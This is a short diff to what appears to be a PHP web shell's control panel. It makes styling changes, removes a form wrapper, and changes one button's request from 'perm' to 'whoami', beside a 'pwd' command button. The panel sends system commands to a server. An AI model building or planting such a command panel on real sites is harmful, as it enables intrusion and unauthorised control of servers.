@@ -100,6 +100,7 @@
 
 #XmenuNav li button {
 	height: 100%;
+	outline: none;
 	border: 0px;
 	padding: 0 10px;	
 	float: left;
@@ -111,6 +112,10 @@
 	background-color: #2d2d2d;
 	color: #fff;
 	border: 0px;
+}
+
+#XmenuNav li button:active {
+	color: #605e56;
 }
 
 #XmenuStats ul li {
@@ -184,7 +189,6 @@
 </style>
 <div id="Xcontainer">
 	<div id="XmenuNav">
-		<form action="" id="XmenuForm">
 		<ul class="XmenuOptions">
 			<li><button id="home"> Home </button></li>
 			<li><button id="XbuttonPwd" name="command" value="pwd">PWD</button></li>
@@ -197,7 +201,6 @@
 				<li id="XPHPversion"> PHP </li>
 			</ul>
 		</div>
-		</form>
 	<br>
 	</div>
 	<div id="XmainContainer">
@@ -250,7 +253,7 @@
 
 		$("#XbuttonPerm").on('click', function(e) {
 			e.preventDefault();
-			request = "perm";
+			request = "whoami";
 			submit(request);
 		});
 
